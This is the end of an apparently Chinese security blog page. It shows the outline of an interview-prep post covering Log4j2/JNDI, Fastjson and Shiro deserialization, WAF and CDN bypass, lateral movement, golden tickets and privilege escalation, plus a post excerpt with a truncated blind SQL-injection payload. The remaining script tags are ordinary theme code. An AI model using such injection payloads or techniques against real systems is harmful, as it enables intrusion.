href="#rmi-jndi-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%A4%A7%E6%A6%82%E8%AF%B4%E4%B8%80%E4%B8%8B%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">2.12.</span> <span class="toc-text"> RMI-JNDI 注入流程大概说一下？（含原理）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap-jndi-%E6%B3%A8%E5%85%A5%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">2.13.</span> <span class="toc-text"> LDAP-JNDI 注入是什么？（含攻击链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi-jndi-%E5%92%8C-ldap-jndi-%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.14.</span> <span class="toc-text"> RMI-JNDI 和 LDAP-JNDI 的主要区别是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.15.</span> <span class="toc-text"> log4j漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-log4j2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">2.16.</span> <span class="toc-text"> Apache Log4j2 远程代码执行的攻击流程是什么？（含攻击链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E5%B8%B8%E5%A6%82%E4%BD%95%E5%B0%86-payload-%E6%B3%A8%E5%85%A5%E5%88%B0-log4j2"><span class="toc-number">2.17.</span> <span class="toc-text"> 攻击者通常如何将 payload 注入到 Log4j2？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-log4j2-jndi-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.18.</span> <span class="toc-text"> 如何防御 Log4j2 JNDI 注入漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1224-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.19.</span> <span class="toc-text"> Fastjson1.2.24 漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1247-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.20.</span> <span class="toc-text"> Fastjson1.2.47 漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-fastjson-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.21.</span> <span class="toc-text"> 如何判断是否存在 Fastjson 漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-%E6%9C%89%E5%87%A0%E7%A7%8D%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.22.</span> <span class="toc-text"> Shiro 有几种漏洞类型？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-shiro-%E6%BC%8F%E6%B4%9E%E5%90%AB-shiro-%E6%A1%86%E6%9E%B6%E7%89%B9%E5%BE%81"><span class="toc-number">2.23.</span> <span class="toc-text"> 如何判断是否存在 Shiro 漏洞？（含 Shiro 框架特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.24.</span> <span class="toc-text"> Apache Shiro550 反序列化漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-shiro721-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%90%AB%E7%89%B9%E5%BE%81"><span class="toc-number">2.25.</span> <span class="toc-text"> Apache Shiro721 反序列化漏洞原理是什么？（含特征）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoerial%E4%B8%ADcc%E9%93%BE%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E6%89%93shiro"><span class="toc-number">2.26.</span> <span class="toc-text"> ysoerial中CC链为什么不能打Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D-fastjson-%E5%92%8C-shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.27.</span> <span class="toc-text"> 如何修复 Fastjson 和 Shiro 反序列化漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.28.</span> <span class="toc-text"> JDBC-mysql反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%ADstruts%E6%A1%86%E6%9E%B6"><span class="toc-number">2.29.</span> <span class="toc-text"> 判断Struts框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.30.</span> <span class="toc-text"> Struts2 远程代码执行漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.30.0.1.</span> <span class="toc-text"> 核心原理步骤：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.31.</span> <span class="toc-text"> Weblogic框架漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.32.</span> <span class="toc-text"> SnakeYaml反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">2.33.</span> <span class="toc-text"> 二次反序列化有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat%E4%B8%ADjsp%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.34.</span> <span class="toc-text"> Tomcat中JSP的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.35.</span> <span class="toc-text"> java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E4%BB%A3%E5%AE%A1"><span class="toc-number">2.36.</span> <span class="toc-text"> java代审</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf"><span class="toc-number">2.37.</span> <span class="toc-text"> java反序列化绕WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%BB%95%E8%BF%87templatesimpl"><span class="toc-number">2.38.</span> <span class="toc-text"> 高版本下绕过templatesImpl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text"> 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text"> 渗透测试思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.2.</span> <span class="toc-text"> 信息收集步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text"> 常见端口服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-cdncdn-%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.4.</span> <span class="toc-text"> 什么是 CDN？CDN 的作用是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-cdn"><span class="toc-number">3.5.</span> <span class="toc-text"> 如何判断目标是否存在 CDN？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-cdn-%E6%89%BE%E7%9C%9F%E5%AE%9E-ip-%E5%9C%B0%E5%9D%80"><span class="toc-number">3.6.</span> <span class="toc-text"> 如何绕过 CDN 找真实 IP 地址？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%8B%E5%B7%A5%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E7%AB%99%E6%98%AF-windows-%E8%BF%98%E6%98%AF-linux-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">3.7.</span> <span class="toc-text"> 如何手工快速判断目标站是 Windows 还是 Linux 服务器？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E5%92%8C%E5%86%B0%E8%9D%8E%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.8.</span> <span class="toc-text"> 蚁剑和冰蝎的区别?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">4.</span> <span class="toc-text"> 内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%AD-getsystem-%E6%97%A0%E6%B3%95%E6%8F%90%E6%9D%83%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">4.1.</span> <span class="toc-text"> MSF 中 Getsystem 无法提权怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%AD%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.2.</span> <span class="toc-text"> MSF 中路由的作用是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%85%B6%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.</span> <span class="toc-text"> 什么是 “哈希传递攻击”？其原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%92%8C-linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.4.</span> <span class="toc-text"> Windows 和 Linux 系统中常见的持久化控制方法有哪些？（权限维持）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms17-010%E6%98%AF%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.5.</span> <span class="toc-text"> ms17-010是什么漏洞？用了什么协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BA%86%E8%A7%A3%E5%90%97%E5%8F%AF%E4%BB%A5%E8%AE%B2%E4%B8%8B%E5%90%97"><span class="toc-number">4.6.</span> <span class="toc-text"> 黄金票据和白银票据了解吗，可以讲下吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E8%AE%B2%E4%B8%8B%E5%88%A9%E7%94%A8%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6%E5%90%97"><span class="toc-number">4.7.</span> <span class="toc-text"> 可以讲下利用黄金票据前提条件吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%9C%89%E5%93%AA%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-number">4.8.</span> <span class="toc-text"> 内网横向有哪些思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">4.9.</span> <span class="toc-text"> Windows提权技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">4.10.</span> <span class="toc-text"> Linux提权技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.11.</span> <span class="toc-text"> 内网信息收集工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F"><span class="toc-number">5.</span> <span class="toc-text"> 蓝队</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text"> 应急响应基本思路</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "面经",
+          url: "http://example.com/2026/01/06/%E9%9D%A2%E7%BB%8F/",
+          excerpt: "",
+          description: "",
+          stripContent: " Web  SQL注入原理 未对用户的输入进行检验过滤，未进行预编译，或者处理的不完整，处理程序不完善，导致可以将恶意代码插入数据库查询语句中，造成SQL注入 联合注入：通过union select将额外的查询条件注入到原始的查询语句中，从而获取数据库中的信息 **布尔盲注：**由于页面无结果回显，只能依据页面回显变化（例如页面内容、状态码或响应时间）利用布尔条件（真/假）来逐位或逐字符猜解数据 1payload = f&amp;#x27;if(ascii(substr((select group_co",
+          date: "Tue Jan 06 2026 23:36:03 GMT+0800",
+          updated: "Wed Mar 04 2026 14:50:37 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
